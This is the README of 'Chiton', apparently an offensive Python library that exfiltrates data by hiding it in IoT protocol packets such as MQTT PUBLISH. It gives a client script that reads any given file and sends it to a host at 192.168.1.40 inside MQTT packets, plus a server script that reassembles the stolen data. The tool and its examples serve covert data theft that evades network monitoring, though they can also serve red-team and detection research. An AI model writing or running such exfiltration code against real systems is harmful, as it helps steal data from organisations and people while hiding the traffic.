# Chitón

![Chitón (Los caprichos) - Francisco de Goya](https://drive.google.com/uc?export=view&id=1yXGYiMW7CumDmnjg0zEu51syuJh21bjY)

[`Chiton`](https://dle.rae.es/?w=chit%C3%B3n) is a Python library to exfiltrate data encapsulating the data into IoT protocol’s packets. The library allows you to encapsulate/de-encapsulate binary data into/from a protocol packets, and send/receive protocol packets to another host over Internet.

## Dependencies

`Chiton` relies on [Scapy Project](https://scapy.net/) to encapsulate/de-encapsulate binary data. It can be installed by the following command:

```Shell
$ python3 -m pip install scapy
```

## Example of Usage

`Chiton` is designed to be imported as a library in any project, and it follows the client/server model The client is responsible of exfiltrate data:

```Python
import sys

import chiton.network.client as client
import chiton.protocol.mqtt as mqtt

def main(filename):
    protocol = mqtt.MQTT(mqtt.PUBLISH)
    mqtt_client = client.Client(protocol, '192.168.1.40')
    data = read_file(filename)
    mqtt_client.send(data)

def read_file(filename):
    with open(filename, 'rb') as f:
        return f.read()

if __name__ == '__main__':
    main(sys.argv[1])
```

In this example, the file to exfiltrate is passed as argument to the script, which reads it as binary data. The chosen protocol in this case is MQTT with the packet type PUBLISH, and this protocol is used to create a client object willing to communicate with the host at address `192.168.1.40`. Finally, the data to exfiltrate is simply sent to the desired host calling the send function with the data as parameter, and the library handles the encapsulation of the data into the protocol’s packet payload.

```Python
import chiton.network.server as server
import chiton.protocol.mqtt as mqtt

def main():
    protocol = mqtt.MQTT(mqtt.PUBLISH)
    mqtt_server = server.Server(protocol)
    data = mqtt_server.recv()
    write_file(data, 'output.bin')


def write_file(data, filename):
    with open(filename, 'wb') as f:
        f.write(data)

if __name__ == '__main__':
    main()
```

In the other side of the communication, the example server script should be running. The workflow is similar to the client, as the server needs to specify the protocol used for data transfer, and data is finally received. The library automatically de-encapsulates the packet payload to reassemble the original payload, ready to be saved into a file.

## License

Licensed under the [GNU AGPLv3](LICENSE) license.
